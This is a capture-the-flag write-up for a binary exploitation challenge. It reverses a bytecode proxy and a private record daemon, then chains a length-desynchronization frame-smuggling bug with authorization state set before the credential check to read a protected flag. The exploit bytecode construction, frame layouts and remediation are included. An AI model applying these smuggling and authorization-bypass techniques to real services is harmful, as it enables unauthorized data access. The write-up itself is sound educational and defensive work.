# Salvage Protocol

| Field | Value |
| --- | --- |
| CTF | z0d1akCTF 2026 Qualifiers |
| Category | Binary Exploitation |
| Author | ludicrouslytrue |
| Points | 136 |
| Solves at time of solving | 83 |
| Flag | `zdk{5a1VAGEd_thR0UgH_7He_sEAM}` |

> something something protocol

## Executive Summary

The handout contains two stripped, statically linked x86-64 daemons. The public
`reclaimd` service interprets a small bytecode language and proxies requests to
the private `vaultd` service. `vaultd` stores five public salvage records and a
protected `vault/flag` record.

The exploit combines two logic flaws:

1. `reclaimd` tracks an **actual payload length** and an attacker-controlled
   **declared payload length** independently. It allocates and sends the frame
   using the actual length but writes the declared length into the private
   protocol header. By declaring zero, the actual payload is left behind for
   `vaultd` to parse as additional frames.
2. `vaultd` processes as many as 64 frames under one request-wide authorization
   state. Its privileged mode resolves the requested record and writes that
   record's ID into the authorization slot **before** checking the clearance
   token. A deliberately failed privileged read therefore authorizes a later
   ordinary read of the same protected record.

The final request wraps two smuggled frames inside a zero-length list request.
The first injected frame intentionally fails clearance but primes authorization;
the second reads `vault/flag` with the stale authorization. The supplied
[solver](solve.py) builds the complete request using only Python's standard
library and recovers the flag from the live TLS service.

## Repository Contents

| Path | Purpose | SHA-256 |
| --- | --- | --- |
| [`challenge/pwn_salvage-protocol.tar.gz`](challenge/pwn_salvage-protocol.tar.gz) | Original handout | `849a151eb5211149030d2f1683b9f1a3440ad4b7d8c85003ba8629216bf64dd7` |
| [`challenge/reclaimd`](challenge/reclaimd) | Public bytecode interpreter | `b0d2619e6a49b43d79eeb45698a6bf3662643fb539a736669fe6b108e954f0d9` |
| [`challenge/vaultd`](challenge/vaultd) | Private record service | `d16ce96dee4cf8eee9fe81796f27bb572e1b702fbd359b62e484c483e1cae1d7` |
| [`solve.py`](solve.py) | Dependency-free remote exploit | - |
| [`artifacts/injected-frames.bin`](artifacts/injected-frames.bin) | Two raw frames smuggled into `vaultd` | `a83c8849f92f9ced3d45bf8ba2b6a1bc5d2f3b3a0582799bb05663a2aab766e6` |
| [`artifacts/vault-wire.bin`](artifacts/vault-wire.bin) | Exact desynchronized stream received by `vaultd` | `446cc7379bdff56395b65b1e846e888279c3135c776182aef08b480747daa14e` |
| [`artifacts/program.bin`](artifacts/program.bin) | Complete `reclaimd` bytecode program | `38c928381c5cfa193dd65a7edbcfa0060580683221d63e028d77bf7fd6ab2fb2` |
| [`artifacts/request.bin`](artifacts/request.bin) | Four-byte length prefix and bytecode | `c2b18f5546b2acede65f269445726af6028329390b4f2e0786f72133425ca22a` |
| [`artifacts/response.txt`](artifacts/response.txt) | Successful live response | `4d178960ff69f6bd6eb3587118a0e4cf62845e22e4d695e905c7a7a74b240df6` |

## 1. Initial Triage

The archive contains only the two daemons:

```console
$ tar -tzvf pwn_salvage-protocol.tar.gz
-rwxrwxrwx ... pwn_salvage-protocol/reclaimd
-rwxrwxrwx ... pwn_salvage-protocol/vaultd
```

Both are static, stripped, non-PIE Linux executables:

```console
$ file reclaimd vaultd
reclaimd: ELF 64-bit LSB executable, x86-64, statically linked, stripped
vaultd:   ELF 64-bit LSB executable, x86-64, statically linked, stripped
```

`rabin2 -I` gives the relevant hardening properties:

| Property | `reclaimd` | `vaultd` |
| --- | --- | --- |
| NX | Enabled | Enabled |
| PIE | Disabled | Disabled |
| Stack canary | Absent | Absent |
| Linking | Static | Static |
| Symbols | Stripped | Stripped |

The lack of a canary initially suggests a conventional memory-corruption
challenge, but the useful attack surface is the custom protocol. Strings in
`vaultd` reveal its record names and flag source:

```text
/sealed/flag
scrap/0
scrap/1
scrap/2
scrap/3
scrap/4
vault/flag
```

`reclaimd` contains the corresponding proxy errors:

```text
[reclaimd] vault offline
[vault] denied
[vault] no such record
[vault] bad request
```

This establishes a two-tier design before any detailed reversing:

```text
attacker  -- public bytecode -->  reclaimd  -- private frames -->  vaultd
```

## 2. Public Wire Protocol

The public service reads a four-byte big-endian program length and then the
bytecode itself. The maximum accepted program length is 8192 bytes:

```text
request  = u32be(program_length) || program
response = u32be(response_length) || response
```

This is easy to confirm with a minimal halt program:

```python
sock.sendall(struct.pack(">I", 1) + b"\x00")
```

The bytecode interpreter starts at `0x401a90` in `reclaimd`. Its conceptual
request state contains:

```c
uint8_t  mode;                    // initially 1
char     path[256];
uint16_t path_length;
uint16_t declared_payload_length;
uint8_t  payload[4096];
uint16_t actual_payload_length;
```

The state has two different payload lengths. That distinction is the first
critical observation.

## 3. Reversing the Bytecode VM

The dispatch table at `0x47d160` maps the following useful opcodes:

| Opcode | Operand | Reconstructed behavior |
| --- | --- | --- |
| `0x00` | none | Halt |
| `0x01` | none | Reset to list mode and clear the path |
| `0x02` | `u8 index` | Select public record `scrap/<index>` and mode 2 |
| `0x10` | `u16be length` | Set only the declared private payload length |
| `0x11` | `u8 byte` | Append one byte to the actual payload |
| `0x20` | `u8 length`, bytes | Replace payload and initialize both lengths |
| `0x30` | none | Build a private frame, send it to `vaultd`, append its reply |
| `0x40` | length-prefixed data | Reject sealed access from public bytecode |
| `0x41` | length-prefixed data | Reject command execution from public bytecode |

The public opcodes intentionally expose only list and salvage-record access.
Opcodes `0x40` and `0x41` consume their operands but return denial messages;
they do not provide a route to `vault/flag`.

### The split-length bug

The implementation of opcode `0x30` begins at `0x401b5a`. The key data flow is:

1. Load `actual_payload_length` to calculate the allocation and transmitted
   frame size.
2. Serialize `mode`, `path_length`, and the path.
3. At `0x401c03`, load `declared_payload_length` and write it after the path.
4. At `0x401c15`, copy `actual_payload_length` bytes from the payload buffer.
5. Send the complete allocation to the loopback `vaultd` service.

Equivalent pseudocode is:

```c
size_t wire_size = 1 + 2 + path_length + 2 + actual_payload_length;
uint8_t *frame = malloc(wire_size);

frame[0] = mode;
write_u16be(frame + 1, path_length);
memcpy(frame + 3, path, path_length);
write_u16be(frame + 3 + path_length, declared_payload_length);
memcpy(frame + 5 + path_length, payload, actual_payload_length);

send(vault_socket, frame, wire_size, 0);
```

Opcode `0x20` sets both lengths, but they can immediately be separated:

- `0x11` grows only the actual payload.
- `0x10` overwrites only the declared payload length.

This lets the attacker send a large physical payload while claiming that it is
zero bytes long.

## 4. Reversing the Private Protocol

`vaultd` parses one or more frames with this format:

```text
+----------+-----------------+------+--------------------+---------+
| mode (1) | path length (2) | path | payload length (2) | payload |
+----------+-----------------+------+--------------------+---------+
             big-endian                 big-endian
```

In compact notation:

```text
u8 mode || u16be path_length || path || u16be payload_length || payload
```

The parser at `0x401e30` advances by the lengths inside each frame. When bytes
remain, it treats them as another frame, up to a maximum of 64 frames. The
frame modes are:

| Mode | Operation |
| --- | --- |
| `1` | List all unprotected records |
| `2` | Read a named record |
| `3` | Read a named record with a 1024-byte clearance payload |

At startup, `vaultd` creates five unprotected `scrap/*` records and one
protected `vault/flag` record. Each internal record is 0x128 bytes and includes
the following relevant fields:

```text
+0x000  path buffer
+0x100  path length
+0x108  protected flag
+0x10c  four-byte clearance token
+0x110  value pointer
+0x118  value length
+0x120  record ID
```

The flag value comes from the `FLAG` environment variable when present, then
falls back to `/sealed/flag`. The clearance token is read from `/dev/urandom`;
`MOJO` is the fallback value if that read fails. Guessing the four-byte token is
therefore not a practical or intended remote solution.

## 5. Finding the Authorization-State Bug

`vaultd` allocates one four-byte authorization slot when entering the multi-
frame parser. The slot lives for the entire batch rather than for one frame.

The mode-3 path first resolves the named record. The critical sequence is:

```text
0x401f88  mov eax, dword [record + 0x120]  ; load record ID
0x401f98  mov dword [auth_slot], eax       ; authorize it immediately
0x401f9a  cmp payload_length, 0x400        ; only now validate length
0x401fa1  mov eax, dword [payload]
0x401fa6  bswap eax
0x401fa8  cmp dword [record + 0x10c], eax  ; validate clearance token
```

If either check fails, execution returns a denial response, but nothing clears
`auth_slot`. In reconstructed pseudocode:

```c
record = lookup(path);
auth_slot = record->id;             // state mutation occurs too early

if (payload_length != 0x400)
    return DENIED;
if (read_u32be(payload) != record->clearance)
    return DENIED;
return record->value;
```

Mode 2 later handles ordinary reads. Public records are always returned. For a
protected record, it accepts the read when the stale slot matches the record's
ID:

```text
0x4020a7  mov eax, dword [record + 0x108]  ; protected?
0x4020bb  mov eax, dword [auth_slot]
0x4020bd  cmp dword [record + 0x120], eax  ; same record ID?
0x4020c9  ... return record value ...
```

The intended invariant was presumably "successful mode 3 authorizes this
record." The implementation instead enforces "attempted mode 3 lookup
authorizes this record."

## 6. Composing the Exploit

Neither bug alone is sufficient:

- The stale authorization bug is in `vaultd`, but `reclaimd` does not expose
  mode 3 or arbitrary protected paths.
- The length desynchronization reaches the private parser, but a direct mode 2
  read still starts with an empty authorization slot.

Together, they provide a complete bypass.

### Step 1: Build a failing mode-3 frame

The first injected frame names `vault/flag` and supplies the required 1024-byte
payload. Its first four bytes are `MOJO`, followed by 1020 zero bytes:

```text
03                         mode 3
00 0a                      path length = 10
76 61 75 6c 74 2f 66 6c 61 67  "vault/flag"
04 00                      payload length = 1024
4d 4f 4a 4f 00 ... 00      bogus clearance payload
```

The frame is 1039 bytes. The remote random clearance does not match, so the
visible result is `[vault] denied`. Before returning that denial, however,
`vaultd` stores the flag record's ID in `auth_slot`.

### Step 2: Build an ordinary mode-2 frame

The second frame requests the same path with no payload:

```text
02                         mode 2
00 0a                      path length = 10
76 61 75 6c 74 2f 66 6c 61 67  "vault/flag"
00 00                      payload length = 0
```

This frame is 15 bytes, making the injected stream `1039 + 15 = 1054` bytes.
Mode 2 sees the flag record ID left by step 1 and returns the protected value.

### Step 3: Hide both frames after a zero-length wrapper

`reclaimd` is reset to mode 1 with no path. We place the 1054-byte injected
stream in its actual payload but set the declared length to zero. The private
wire data therefore begins conceptually as:

```text
01 0000 0000 | 03 000a "vault/flag" 0400 ... | 02 000a "vault/flag" 0000
^ wrapper      ^ injected privileged frame       ^ injected read frame
```

`vaultd` consumes only five bytes for the wrapper because it trusts `0000` as
the payload length. Its parser loop then starts again at `03`, followed by
`02`. All three frames share the same authorization slot.

The mode-1 wrapper explains why the successful response starts by listing
`scrap/0` through `scrap/4` before showing the mode-3 denial and the flag.

### Step 4: Encode the stream in public bytecode

Opcode `0x20` has an 8-bit operand length, so it can seed only the first 255
bytes. The remaining 799 bytes are appended one at a time with `0x11`:

```python
first, rest = injected[:255], injected[255:]
program  = b"\x01"                         # reset to mode 1
program += b"\x20" + bytes([255]) + first # initialize actual payload
program += b"".join(b"\x11" + bytes([b]) for b in rest)
program += b"\x10\x00\x00"                # declare payload length 0
program += b"\x30"                         # proxy to vaultd
program += b"\x00"                         # halt
```

The resulting sizes are:

| Component | Calculation | Size |
| --- | --- | ---: |
| Injected private frames | `1039 + 15` | 1054 bytes |
| Private stream with wrapper | `5 + 1054` | 1059 bytes |
| Reset instruction | `1` | 1 byte |
| Initial payload instruction | `2 + 255` | 257 bytes |
| Append instructions | `799 * 2` | 1598 bytes |
| Set declared length | `1 + 2` | 3 bytes |
| Execute and halt | `1 + 1` | 2 bytes |
| Complete VM program | `1 + 257 + 1598 + 3 + 2` | 1861 bytes |
| Public request | `4 + 1861` | 1865 bytes |

The program stays comfortably below the 8192-byte public input limit.

## 7. Reproducing the Solve

No third-party Python modules are required. Run the solver from this directory:

```console
$ python3 solve.py --dump-dir artifacts
[+] injected vault frames: 1054 bytes
[+] private vault stream:  1059 bytes
[+] reclaimd VM program:   1861 bytes
[+] public wire request:   1865 bytes
[+] connecting to salvage-protocol-09b2e247a60b.chals.z0d1ak.org:1337 with TLS
scrap/0
scrap/1
scrap/2
scrap/3
scrap/4

[vault] denied
zdk{5a1VAGEd_thR0UgH_7He_sEAM}
[+] wrote exploit artifacts to artifacts
[+] flag: zdk{5a1VAGEd_thR0UgH_7He_sEAM}
```

To regenerate the binary exploit artifacts without contacting the server:

```console
$ python3 solve.py --dry-run --dump-dir /tmp/salvage-artifacts
```

The three generated request artifacts can be compared byte-for-byte with the
committed copies. `response.txt` records the successful live service response.

## 8. Root Cause and Remediation

This challenge demonstrates two broader secure-design lessons.

### Use one canonical length

A serialized field and the buffer it describes must derive from the same
validated value. `reclaimd` should reject a state where the declared length and
actual length differ, or better, remove the declared-length setter and always
serialize `actual_payload_length`.

### Validate before mutating authorization state

`vaultd` should not write an authorization slot until every credential check
has succeeded. The safe order is:

```c
record = lookup(path);
if (payload_length != 0x400)
    return DENIED;
if (read_u32be(payload) != record->clearance)
    return DENIED;

auth_slot = record->id;
return record->value;
```

It should also avoid sharing mutable authorization across independently parsed
frames. Clearing authorization at each frame boundary, using an unforgeable
capability bound to one operation, or accepting only one request per message
would prevent the failed frame from influencing the next one.

## Flag

```text
zdk{5a1VAGEd_thR0UgH_7He_sEAM}
```
